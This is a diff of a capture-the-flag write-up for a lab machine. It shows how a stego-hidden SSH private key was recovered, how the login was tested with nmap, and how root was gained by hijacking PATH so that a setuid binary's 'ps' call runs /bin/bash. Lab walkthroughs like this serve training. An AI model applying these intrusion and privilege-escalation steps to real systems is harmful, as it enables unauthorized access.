@@ -6,48 +6,29 @@
 
 On the end of the page, we can see a base64 encoded string
 
-echo VWtaS1FsSXdPVTlKUlVwQ1ZFVjNQUT09 | base64 --decode >>
+```bash
+    $ echo VWtaS1FsSXdPVTlKUlVwQ1ZFVjNQUT09 | base64 --decode
     UkZKQlIwOU9JRUpCVEV3PQ==
-
-echo UkZKQlIwOU9JRUpCVEV3PQ== | base64 --decode >>
+    
+    $ echo UkZKQlIwOU9JRUpCVEV3PQ== | base64 --decode
     RFJBR09OIEJBTEw=
 
-echo RFJBR09OIEJBTEw= | base64 --decode
+    $ echo RFJBR09OIEJBTEw= | base64 --decode
     DRAGON BALL
-
-This could be the hidden dir, so we do
-
-http://10.0.0.34/DRAGON BALL/
-
-And find secrets.txt with:
-```
-    /facebook.com
-    /youtube.com
-    /google.com
-    /vanakkam nanba
-    /customer
-    /customers
-    /taxonomy
-    /username
-    /passwd
-    /yesterday
-    /yshop
-    /zboard
-    /zeus
-    /aj.html
-    /zoom.html
-    /zero.html
-    /welcome.html
 ```
 
-And /Vulnhub with:
+This could be the hidden dir, so we go to `http://10.0.0.34/DRAGON BALL/`
+
+There, there is the `/Vulnhub` directory with the following:
+
 - login.html
 - aj.jpg
 
-With this, we download the aj.jpg and check if there is any hidden information on the image (stegnography)
+With this, we download the `aj.jpg` and check if there is any hidden information on the image (stegnography)
 
-stegcracker /home/kali/Downloads/aj.jpg 
-```
+```bash
+    $ stegcracker /home/kali/Downloads/aj.jpg
+
     StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
     Copyright (c) 2025 - Luke Paris (Paradoxis)
 
@@ -64,10 +45,14 @@ stegcracker /home/kali/Downloads/aj.jpg
     Tried 387 passwords
     Your file has been written to: /home/kali/Downloads/aj.jpg.out
     love
+
 ```
 
-/home/kali/Downloads/aj.jpg.out has the following content:
-```
+When we check `/home/kali/Downloads/aj.jpg.out`, the file we obtained from the `stegcracker` has the following content:
+
+```bash
+    $ cat aj.jpg.out
+
     -----BEGIN OPENSSH PRIVATE KEY-----
     b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
     NhAAAAAwEAAQAAAYEAwG6N5oDbTLLfRAwa7GCQw5vX0GWMxe56fzIEHYmWQw54Gb1qawl/
@@ -108,12 +93,13 @@ stegcracker /home/kali/Downloads/aj.jpg
     -----END OPENSSH PRIVATE KEY-----
 ```
 
-With this ssh key, we try to brute force the username
+With this ssh key, we are only missing the username
 
-Here, xmen attempt was used because when we go to http://10.0.0.34/DRAGON%20BALL/Vulnhub/login.html, it appears "WELCOME TO xmen"
+Here, `xmen` attempt was used because when we go to `http://10.0.0.34/DRAGON%20BALL/Vulnhub/login.html`, it appears "WELCOME TO xmen" otherwise we would try to brute-force the username using `rockyou.txt`
 
-nmap -p 22 --script ssh-publickey-acceptance --script-args 'ssh.usernames={"root", "aj", "xmen"}, privatekeys={"/home/kali/Downloads/aj.jpg.out"}' 10.0.0.34
-```
+```bash
+    $ nmap -p 22 --script ssh-publickey-acceptance --script-args 'ssh.usernames={"root", "aj", "xmen"}, privatekeys={"/home/kali/Downloads/aj.jpg.out"}' 10.0.0.34
+
     Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-12 19:44 EST
     NSE: [ssh-publickey-acceptance] Failed to authenticate
     NSE: [ssh-publickey-acceptance] Failed to authenticate
@@ -130,9 +116,11 @@ nmap -p 22 --script ssh-publickey-acceptance --script-args 'ssh.usernames={"root
     Nmap done: 1 IP address (1 host up) scanned in 0.67 seconds
 ```
 
-When trying to ssh we get:
-ssh -i /home/kali/Downloads/aj.jpg.out xmen@10.0.0.34
-```
+Then, we try to ssh into the target, but we get:
+
+```bash
+    $ ssh -i /home/kali/Downloads/aj.jpg.out xmen@10.0.0.34
+
     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
     @         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@ -143,75 +131,93 @@ ssh -i /home/kali/Downloads/aj.jpg.out xmen@10.0.0.34
     xmen@10.0.0.34's password: 
 ```
 
-We do:
-```
-# make sure you own the file
-sudo chown $(whoami):$(whoami) /home/kali/Downloads/aj.jpg.out
+To fix this, we do:
 
-# set strict permissions so only you can read/write
-chmod 600 /home/kali/Downloads/aj.jpg.out
+```bash
+    # make sure you own the file
+    $ sudo chown $(whoami):$(whoami) /home/kali/Downloads/aj.jpg.out
+
+    # set strict permissions so only you can read/write
+    $ chmod 600 /home/kali/Downloads/aj.jpg.out
 ```
 
-And if we ssh, we have ssh access, if we do ls we have the local.txt that contains our 1st flag
-your falg :192fb6275698b5ad9868c7afb62fd555
+Finally we ssh, we get access to the target. If we do `ls` we have the `local.txt` that contains our 1st flag:
+
+`your falg :192fb6275698b5ad9868c7afb62fd555`
 
 ### proof.txt
 
-ls -al
-```
--rw-r--r-- 1 root root    75 Jan  4  2021 demo.c
--rwsr-xr-x 1 root root 16712 Jan  4  2021 shell
+Since we already have ssh access to the target, we go to the home dir of `xmen` and if we list everything in that dir, this is what we get:
+
+```bash
+    $ ls -al
+
+    -rw-r--r-- 1 root root    75 Jan  4  2021 demo.c
+    -rwsr-xr-x 1 root root 16712 Jan  4  2021 shell
 ```
 
-We can see that there is a 's' in 'shell', this means that when any user runs this script, it will be executed as root, because it will change the UID to root since it is the owner of the file.
+We can see that there is a `s` in `shell` file. This means that when any user runs this script, it will execute with the privileges of the file owner. Since the file is owned by root, the script will run with root privileges.
 
-We also know that shell is a compilation of demo.c that looks like this 
-```
+We also know that shell is a compilation of demo.c that looks like this
+
+```bash
+    $ cat demo.c
+
     #include<unistd.h>
     void main()
-    { setuid(0);
-    setgid(0);
-    system("ps");
-}
-```
-
-If we inject a malicous binary, we can elevate our priviledges
-
-For that, we need to create a binary and put a reference to it in $PATH since the 'ps' command is not sepcficied with a full path to the correct bin
-
-Now if we check $PATH, we can see the following on $PATH
+    { 
+        setuid(0);
+        setgid(0);
+        system("ps");
+    }
 
 ```
+
+If we inject a malicous binary, we can elevate our priviledges, since the instruction `system("ps")` does not specify the exact path to the binary
+
+To elevate our privileges, we need to create another binary and put a reference to it in `$PATH`
+
+Before any changes, if we check `$PATH`, we can see the following on $PATH
+
+```bash
+    $ echo $PATH
     /usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
 ```
 
-If we put /home/xmen first, the first command it will be recognize by ps it will be our malicious binary, to do that, execute:
-    
+If we put `/home/xmen` directory first, the first binary to be used when `ps` is executed it will be our malicious binary. But first we change the `$PATH` like so:
+
+```bash
     export PATH=/home/xmen:$PATH
-
-And now PATH looks like:
-    
-    /home/xmen:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
-
-Now on /home/xmen do:
 ```
+
+And now `$PATH` looks like:
+
+```bash
+    $ echo $PATH
+    /home/xmen:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+```
+
+Now on `/home/xmen` we do:
+
+```bash
     # Get high privileges
-    echo "/bin/bash" > ps
+    $ echo "/bin/bash" > /home/xmen/ps
 
     # Give permissions to the script
-    chmod +x ps
+    $ chmod +x ps
 
     # Check
-    which ps
-        /home/xmen/ps
+    $ which ps
+    /home/xmen/ps
 ```
 
-If I now execute -/scripts/shell, I am root, byexecuting I can check:
-```
-    id
-        uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),1000(xmen)
+If I now execute `~/scripts/shell`, we get a shell as root, by executing the script, I can then check:
+
+```bash
+    $ id
+    uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),1000(xmen)
 ```
 
-Now I go to /root and I can see the proof.txt with flag:
-    
-your flag: 031f7d2d89b9dd2da3396a0d7b7fb3e2
+Now I go to `/root` and I can see the `proof.txt` with flag:
+
+`your flag: 031f7d2d89b9dd2da3396a0d7b7fb3e2`
